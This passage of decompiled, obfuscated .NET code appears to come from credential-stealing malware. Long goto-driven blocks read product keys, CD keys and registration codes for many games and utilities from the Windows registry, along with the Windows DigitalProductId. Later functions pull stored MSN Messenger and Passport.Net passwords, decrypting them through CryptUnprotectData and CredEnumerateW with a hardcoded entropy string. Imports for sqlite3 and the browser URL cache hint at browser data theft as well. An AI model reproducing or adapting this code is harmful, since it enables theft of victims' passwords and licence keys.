					IL_2b0b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2b12;
					IL_2b12:
					num = 656;
					text53 += "\r\nThe Battle for Middle-earth :";
					goto IL_2b24;
					IL_2b24:
					num = 657;
					text219 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Games\\The Battle for Middle-earth", "ergc", null));
					goto IL_2b41;
					IL_2b41:
					num = 658;
					text53 += text219;
					goto IL_2b50;
					IL_2b50:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2b57;
					IL_2b57:
					num = 660;
					text53 += "\r\nThe Orange Box :";
					goto IL_2b69;
					IL_2b69:
					num = 661;
					text220 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Games\\The Orange Box", "ergc", null));
					goto IL_2b86;
					IL_2b86:
					num = 662;
					text53 += text220;
					goto IL_2b95;
					IL_2b95:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2b9c;
					IL_2b9c:
					num = 664;
					text53 += "\r\nThe Orange Box :";
					goto IL_2bae;
					IL_2bae:
					num = 665;
					text221 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "Timeshift", null));
					goto IL_2bcb;
					IL_2bcb:
					num = 666;
					text53 += text221;
					goto IL_2bda;
					IL_2bda:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2be1;
					IL_2be1:
					num = 668;
					text53 += "\r\nTMPGEnc DVD Author :";
					goto IL_2bf3;
					IL_2bf3:
					num = 669;
					text222 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Pegasys Inc.\\TMPGEnc DVD Author\\1.0", "RegistrationCode", null));
					goto IL_2c10;
					IL_2c10:
					num = 670;
					text53 += text222;
					goto IL_2c1f;
					IL_2c1f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2c26;
					IL_2c26:
					num = 672;
					text53 += "\r\nTuneUp 2007 (Name) :";
					goto IL_2c38;
					IL_2c38:
					num = 673;
					text223 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "UserName", null));
					goto IL_2c55;
					IL_2c55:
					num = 674;
					text53 += text223;
					goto IL_2c64;
					IL_2c64:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2c6b;
					IL_2c6b:
					num = 676;
					text53 += "\r\nTuneUp 2007 (Key) :";
					goto IL_2c7d;
					IL_2c7d:
					num = 677;
					text224 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "RegCode", null));
					goto IL_2c9a;
					IL_2c9a:
					num = 678;
					text53 += text224;
					goto IL_2ca9;
					IL_2ca9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2cb0;
					IL_2cb0:
					num = 680;
					text53 += "\r\nTuneUp 2007 (Company) :";
					goto IL_2cc2;
					IL_2cc2:
					num = 681;
					text225 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "Company", null));
					goto IL_2cdf;
					IL_2cdf:
					num = 682;
					text53 += text225;
					goto IL_2cee;
					IL_2cee:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2cf5;
					IL_2cf5:
					num = 684;
					text53 += "\r\nTuneUp 2008 (Name) :";
					goto IL_2d07;
					IL_2d07:
					num = 685;
					text226 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "UserName", null));
					goto IL_2d24;
					IL_2d24:
					num = 686;
					text53 += text226;
					goto IL_2d33;
					IL_2d33:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2d3a;
					IL_2d3a:
					num = 688;
					text53 += "\r\nTuneUp 2008 (Key) :";
					goto IL_2d4c;
					IL_2d4c:
					num = 689;
					text227 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "RegCode", null));
					goto IL_2d69;
					IL_2d69:
					num = 690;
					text53 += text227;
					goto IL_2d78;
					IL_2d78:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2d7f;
					IL_2d7f:
					num = 692;
					text53 += "\r\nTuneUp 2008 (Company) :";
					goto IL_2d91;
					IL_2d91:
					num = 693;
					text228 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "Company", null));
					goto IL_2dae;
					IL_2dae:
					num = 694;
					text53 += text228;
					goto IL_2dbd;
					IL_2dbd:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2dc4;
					IL_2dc4:
					num = 696;
					text53 += "\r\nTuneUp 2009 (Name) :";
					goto IL_2dd6;
					IL_2dd6:
					num = 697;
					text229 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "UserName", null));
					goto IL_2df3;
					IL_2df3:
					num = 698;
					text53 += text229;
					goto IL_2e02;
					IL_2e02:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2e09;
					IL_2e09:
					num = 700;
					text53 += "\r\nTuneUp 2009 (Key) :";
					goto IL_2e1b;
					IL_2e1b:
					num = 701;
					text230 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "ProductKey", null));
					goto IL_2e38;
					IL_2e38:
					num = 702;
					text53 += text230;
					goto IL_2e47;
					IL_2e47:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2e4e;
					IL_2e4e:
					num = 704;
					text53 += "\r\nTuneUp 2009 (Company) :";
					goto IL_2e60;
					IL_2e60:
					num = 705;
					text231 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "Company", null));
					goto IL_2e7d;
					IL_2e7d:
					num = 706;
					text53 += text231;
					goto IL_2e8c;
					IL_2e8c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2e93;
					IL_2e93:
					num = 708;
					text53 += "\r\nWinamp (Username) :";
					goto IL_2ea5;
					IL_2ea5:
					num = 709;
					text232 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regname", null));
					goto IL_2ec2;
					IL_2ec2:
					num = 710;
					text53 += text232;
					goto IL_2ed1;
					IL_2ed1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2ed8;
					IL_2ed8:
					num = 712;
					text53 += "\r\nWinamp (Serial) :";
					goto IL_2eea;
					IL_2eea:
					num = 713;
					text233 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regkey", null));
					goto IL_2f07;
					IL_2f07:
					num = 714;
					text53 += text233;
					goto IL_2f16;
					IL_2f16:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2f1d;
					IL_2f1d:
					num = 716;
					text17 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Sims\\The Sims 3\\ergc", "", "E_NotFound"));
					goto IL_2f3e;
					IL_2f3e:
					num = 717;
					text18 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Sims\\The Sims 2\\ergc", "", "E_NotFound"));
					goto IL_2f5f;
					IL_2f5f:
					num = 718;
					text19 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Family Fun Stuff\\erg", "", "E_NotFound"));
					goto IL_2f80;
					IL_2f80:
					num = 719;
					text21 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Glamour Life Stuff\\ergc", "", "E_NotFound"));
					goto IL_2fa1;
					IL_2fa1:
					num = 720;
					text22 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Nightlife\\ergc", "", "E_NotFound"));
					goto IL_2fc2;
					IL_2fc2:
					num = 721;
					text27 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Open For Business\\ergc", "", "E_NotFound"));
					goto IL_2fe3;
					IL_2fe3:
					num = 722;
					text30 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 University\\ergc", "", "E_NotFound"));
					goto IL_3004;
					IL_3004:
					num = 723;
					text33 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\SPORE(TM)\\ergc ", "", "E_NotFound"));
					goto IL_3025;
					IL_3025:
					num = 724;
					text31 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Mirror's Edge\\ergc ", "", "E_NotFound"));
					goto IL_3046;
					IL_3046:
					num = 725;
					text36 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty", "", "E_NotFound"));
					goto IL_3067;
					IL_3067:
					num = 726;
					text37 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty2", "", "E_NotFound"));
					goto IL_3088;
					IL_3088:
					num = 727;
					text38 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty4", "", "E_NotFound"));
					goto IL_30a9;
					IL_30a9:
					num = 728;
					text39 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty WAW", "", "E_NotFound"));
					goto IL_30ca;
					IL_30ca:
					num = 729;
					text40 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Half-Life\\Settings", "", "E_NotFound"));
					goto IL_30eb;
					IL_30eb:
					num = 730;
					text41 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft Games\\Halo", "", "E_NotFound"));
					goto IL_310c;
					IL_310c:
					num = 731;
					text42 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\CounterStrike\\Settings", "", "E_NotFound"));
					goto IL_312d;
					IL_312d:
					num = 732;
					string_ = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\";
					string_2 = "DigitalProductId";
					text43 = Class34.smethod_140(string_2, string_);
					goto IL_314c;
					IL_314c:
					num = 733;
					text44 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Rockstar Games\\Grand Theft Auto IV", "", "CDKey"));
					goto IL_316d;
					IL_316d:
					num = 734;
					text34 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 09\\ergc", "", "E_NotFound"));
					goto IL_318e;
					IL_318e:
					num = 735;
					text35 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\KONAMI\\PES2009", "", ""));
					goto IL_31af;
					IL_31af:
					num = 736;
					text32 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Dead Space\\ergc", "", "E_NotFound"));
					goto IL_31d0;
					IL_31d0:
					num = 737;
					text20 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Battlefield 2 Special Forces\\ergc", "", "E_NotFound"));
					goto IL_31f1;
					IL_31f1:
					num = 738;
					text29 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Transformers2", "", "License"));
					goto IL_3212;
					IL_3212:
					num = 739;
					text28 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Rockstar Games\\Bully Scholarship Edition", "", "License"));
					goto IL_3233;
					IL_3233:
					num = 740;
					text23 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AHEAD\\NERO BURNING ROM ", "", "Serial"));
					goto IL_3254;
					IL_3254:
					num = 741;
					text24 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AHEAD\\INSTALLATION\\FAMILIES\\NERO 7\\INFO", "", "Serial"));
					goto IL_3275;
					IL_3275:
					num = 742;
					text25 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AHEAD\\INSTALLATION\\FAMILIES\\NERO 8\\INFO", "", "Serial"));
					goto IL_3296;
					IL_3296:
					num = 743;
					text26 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\NERO\\SHARED\\FAMILIES\\NL9", "", "Serial"));
					goto IL_32b7;
					IL_32b7:
					num = 744;
					text15 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0", "", "RegisteredTo"));
					goto IL_32d8;
					IL_32d8:
					num = 745;
					text16 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\4.0", "", "RegistrationKey"));
					goto IL_32f9;
					IL_32f9:
					num = 746;
					text14 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerDVD", "", "CDKey"));
					goto IL_331a;
					IL_331a:
					num = 747;
					text13 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerBar", "", "CDKey"));
					goto IL_333b;
					IL_333b:
					num = 748;
					Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\CDKey", "", "fear"));
					goto IL_335b;
					IL_335b:
					num = 749;
					text11 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY\\UBI.COM", "", "CDKey"));
					goto IL_337c;
					IL_337c:
					num = 750;
					text12 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\CDKey", "", "CDKey"));
					goto IL_339d;
					IL_339d:
					num = 751;
					text10 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 08\\ergc", "", "E_NotFound"));
					goto IL_33be;
					IL_33be:
					num = 752;
					text9 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 07\\ergc", "", "E_NotFound"));
					goto IL_33df;
					IL_33df:
					num = 753;
					text8 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 2005\\ergc", "", "E_NotFound"));
					goto IL_3400;
					IL_3400:
					num = 754;
					text7 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 2004\\ergc", "", "E_NotFound"));
					goto IL_3421;
					IL_3421:
					num = 755;
					text6 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", "", "E_NotFound"));
					goto IL_3442;
					IL_3442:
					num = 756;
					text5 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc", "", "E_NotFound"));
					goto IL_3463;
					IL_3463:
					num = 757;
					text3 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\", "", "UserName"));
					goto IL_3484;
					IL_3484:
					num = 758;
					text4 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\", "", "License"));
					goto IL_34a5;
					IL_34a5:
					num = 759;
					text2 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\KONAMI\\PES2008", "", "code"));
					goto IL_34c6;
					IL_34c6:
					num = 760;
					text = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Orange Box", "", "ergc"));
					goto IL_34e7;
					IL_34e7:
					num = 761;
					text45 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\7.0", "RegisteredTo", null));
					goto IL_3504;
					IL_3504:
					num = 762;
					text46 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\7.0", "RegistrationKey", null));
					goto IL_3521;
					IL_3521:
					num = 763;
					text47 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 10\\ergc", "", "E_NotFound"));
					goto IL_3542;
					IL_3542:
					num = 764;
					text48 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\10.0", "UserName", null));
					goto IL_355f;
					IL_355f:
					num = 765;
					text49 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\10", "UserName", null));
					goto IL_357c;
					IL_357c:
					num = 766;
					text50 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\10.0", "ProductKey", null));
					goto IL_3599;
					IL_3599:
					num = 767;
					text51 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\10.0", "ProductKey", null));
					goto IL_35b6;
					end_IL_0000_2:
					break;
				}
				num = 769;
				text53 += text52;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 17777;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text53;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static string smethod_5(string string_0, string string_1, Form1 form1_0, string string_2)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string[] array2 = default(string[]);
		string[] array = default(string[]);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 82:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0014;
						case 4:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 5:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0014:
					num = 3;
					array2 = Strings.Split(array[1], string_1, -1, (CompareMethod)0);
					break;
					IL_0007:
					num = 2;
					array = Strings.Split(string_2, string_0, -1, (CompareMethod)0);
					goto IL_0014;
					end_IL_0000_2:
					break;
				}
				num = 4;
				text = array2[0];
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 82;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static string smethod_6(Class17 class17_0)
	{
		return class17_0.string_0;
	}

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CryptUnprotectData(ref Class10.Struct14 struct14_0, int int_0, ref Class10.Struct14 struct14_1, int int_1, int int_2, int int_3, ref Class10.Struct14 struct14_2);

	[DllImport("sqlite3")]
	static extern int sqlite3_step(IntPtr intptr_0);

	static string smethod_7(byte[] byte_0)
	{
		Form1.Struct2 struct2_ = default(Form1.Struct2);
		Form1.Struct2 struct2_2 = default(Form1.Struct2);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		struct2_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct2_.int_0 = byte_0.Length;
		gCHandle.Free();
		Form1.Struct2 @struct = default(Form1.Struct2);
		Form1.Struct2 struct2_3 = @struct;
		Form1.Struct1 struct2 = default(Form1.Struct1);
		Form1.Struct1 struct1_ = struct2;
		IntPtr intptr_ = default(IntPtr);
		Class34.CryptUnprotectData_2(ref struct2_, (string)null, ref struct2_3, intptr_, ref struct1_, 0, ref struct2_2);
		checked
		{
			byte[] array = new byte[struct2_2.int_0 + 1];
			Marshal.Copy(struct2_2.intptr_0, array, 0, struct2_2.int_0);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int FindCloseUrlCache(int int_0);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int FindFirstUrlCacheEntryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, IntPtr intptr_0, ref int int_0);

	[DllImport("sqlite3")]
	static extern int sqlite3_open(IntPtr intptr_0, ref IntPtr intptr_1);

	static Form1 smethod_8(Class1.Class2 class2_0)
	{
		class2_0.form1_0 = Class1.Class2.smethod_0(class2_0.form1_0);
		return class2_0.form1_0;
	}

	static void smethod_9(byte[] byte_0, Class41.Class45 class45_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
		}
		int num3 = 0;
		int num4 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num3;
			num3 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num5 = array2[j] & 0x1FF80;
				int num6 = num3 & 0x1FF80;
				num4 += num6 - num5 >> 16 - j;
			}
		}
		class45_0.short_0 = new short[num4];
		int num7 = 512;
		for (int num8 = 15; num8 >= 10; num8--)
		{
			int num9 = num3 & 0x1FF80;
			num3 -= array[num8] << 16 - num8;
			int num10 = num3 & 0x1FF80;
			for (int k = num10; k < num9; k += 128)
			{
				class45_0.short_0[Class34.smethod_164(k)] = (short)((-num7 << 4) | num8);
				num7 += 1 << num8 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num11 = byte_0[l];
			if (num11 == 0)
			{
				continue;
			}
			num3 = array2[num11];
			int num12 = Class34.smethod_164(num3);
			if (num11 <= 9)
			{
				do
				{
					class45_0.short_0[num12] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < 512);
			}
			else
			{
				int num13 = class45_0.short_0[num12 & 0x1FF];
				int num14 = 1 << (num13 & 0xF);
				num13 = -(num13 >> 4);
				do
				{
					class45_0.short_0[num13 | (num12 >> 9)] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < num14);
			}
			array2[num11] = num3 + (1 << 16 - num11);
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	static void smethod_10(Form1.Class5.Delegate1 delegate1_0)
	{
		Form1.Class5.delegate1_0 = (Form1.Class5.Delegate1)Delegate.Remove(Form1.Class5.delegate1_0, delegate1_0);
	}

	static string smethod_11(Class15 class15_0)
	{
		return class15_0.string_1;
	}

	[DllImport("sqlite3")]
	static extern int sqlite3_column_count(IntPtr intptr_0);

	static void smethod_12(Class10 class10_0)
	{
		class10_0.list_0.Clear();
		string string_ = "Software\\Microsoft\\MessengerService";
		int int_ = default(int);
		int num = Class34.RegOpenKeyExA(-2147483647, ref string_, 0, 131097, ref int_);
		int int_2 = 0;
		int int_3 = int_;
		string_ = "PasswordMSN Messenger Service";
		int int_4 = default(int);
		num = Class34.RegQueryValueExA(int_3, ref string_, 0, ref int_4, IntPtr.Zero, ref int_2);
		checked
		{
			string text;
			if (int_2 > 0)
			{
				IntPtr intPtr = Marshal.AllocHGlobal(int_2);
				int int_5 = int_;
				string_ = "PasswordMSN Messenger Service";
				num = Class34.RegQueryValueExA(int_5, ref string_, 0, ref int_4, intPtr, ref int_2);
				text = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				text = Strings.Mid(text, 1, Strings.Len(text) - 1);
				string string_2 = Class34.smethod_102(ref text, class10_0);
				int_2 = 0;
				int int_6 = int_;
				string_ = "UserMSN Messenger Service";
				num = Class34.RegQueryValueExA(int_6, ref string_, 0, ref int_4, IntPtr.Zero, ref int_2);
				intPtr = Marshal.AllocHGlobal(int_2);
				int int_7 = int_;
				string_ = "UserMSN Messenger Service";
				num = Class34.RegQueryValueExA(int_7, ref string_, 0, ref int_4, intPtr, ref int_2);
				string text2 = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				text2 = Strings.Mid(text2, 1, Strings.Len(text2) - 1);
				List<Class17> list_ = class10_0.list_0;
				string_ = string.Empty;
				list_.Add(new Class17(ref text2, ref string_2, ref string_));
				Class34.RegCloseKey_1(int_);
			}
			Class34.RegCloseKey_1(int_);
			string_ = "Software\\Microsoft\\MSNMessenger";
			Class10.Struct14 struct14_ = default(Class10.Struct14);
			Class10.Struct14 struct14_2 = default(Class10.Struct14);
			if (Class34.RegOpenKeyExA(-2147483647, ref string_, 0, 131097, ref int_) == 0)
			{
				int_2 = 0;
				int int_8 = int_;
				string_ = "Password.NET Messenger Service";
				if (Class34.RegQueryValueExA(int_8, ref string_, 0, ref int_4, IntPtr.Zero, ref int_2) == 0)
				{
					IntPtr intPtr = Marshal.AllocHGlobal(int_2);
					int int_9 = int_;
					string_ = "Password.NET Messenger Service";
					if (Class34.RegQueryValueExA(int_9, ref string_, 0, ref int_4, intPtr, ref int_2) != 0)
					{
						return;
					}
					struct14_.int_1 = intPtr.ToInt32() + 2;
					struct14_.int_0 = int_2 - 2;
					Class34.CryptUnprotectData_1(ref struct14_, 0, 0, 0, 0, 1, ref struct14_2);
					string string_3 = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					string string_4 = Class34.smethod_102(ref string_3, class10_0);
					int_2 = 0;
					int int_10 = int_;
					string_ = "User.NET Messenger Service";
					num = Class34.RegQueryValueExA(int_10, ref string_, 0, ref int_4, IntPtr.Zero, ref int_2);
					intPtr = Marshal.AllocHGlobal(int_2);
					int int_11 = int_;
					string_ = "User.NET Messenger Service";
					num = Class34.RegQueryValueExA(int_11, ref string_, 0, ref int_4, intPtr, ref int_2);
					string text3 = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					text3 = Strings.Mid(text3, 1, Strings.Len(text3) - 1);
					List<Class17> list_2 = class10_0.list_0;
					string_ = string.Empty;
					list_2.Add(new Class17(ref text3, ref string_4, ref string_));
					Class34.LocalFree_1(struct14_2.int_1);
				}
			}
			text = "Passport.Net\\*";
			int int_12 = default(int);
			IntPtr intptr_ = default(IntPtr);
			Class34.CredEnumerateW_1(text, 0, ref int_12, ref intptr_);
			Class10.Struct16 @struct = default(Class10.Struct16);
			Class10.Struct16 struct2 = default(Class10.Struct16);
			IntPtr intPtr3 = default(IntPtr);
			IntPtr intPtr5 = default(IntPtr);
			int i;
			if (int_12 > 0)
			{
				Class10.Struct14 struct14_3 = default(Class10.Struct14);
				struct14_3.int_0 = 74;
				IntPtr intPtr2 = Marshal.AllocHGlobal(74);
				string text4 = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0\0";
				int num2 = 0;
				do
				{
					Marshal.WriteInt16(intPtr2, num2 * 2, (short)(Strings.Asc(Strings.Mid(text4, num2 + 1, 1)) * 4));
					num2++;
				}
				while (num2 <= 36);
				struct14_3.int_1 = intPtr2.ToInt32();
				int num3 = int_12 - 1;
				IntPtr intPtr4 = default(IntPtr);
				for (i = 0; i <= num3; i++)
				{
					IntPtr intPtr = Marshal.ReadIntPtr(intptr_, i * 4);
					object? obj = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj != null) ? ((Class10.Struct16)obj) : struct2);
					struct14_.int_1 = @struct.int_5;
					struct14_.int_0 = @struct.int_4;
					struct14_2.int_0 = 0;
					struct14_2.int_1 = 0;
					Class34.CryptUnprotectData(ref struct14_, 0, ref struct14_3, 0, 0, 0, ref struct14_2);
					List<Class17> list_3 = class10_0.list_0;
					IntPtr intptr_2 = intPtr3;
					intPtr3 = new IntPtr(@struct.int_10);
					string_ = Class34.smethod_142(intptr_2, (Class8)class10_0);
					IntPtr intptr_3 = intPtr4;
					intPtr4 = new IntPtr(struct14_2.int_1);
					string string_5 = Class34.smethod_142(intptr_3, (Class8)class10_0);
					IntPtr intptr_4 = intPtr5;
					intPtr5 = new IntPtr(@struct.int_2);
					string string_6 = Class34.smethod_142(intptr_4, (Class8)class10_0);
					list_3.Add(new Class17(ref string_, ref string_5, ref string_6));
					Class34.LocalFree_1(struct14_2.int_1);
				}
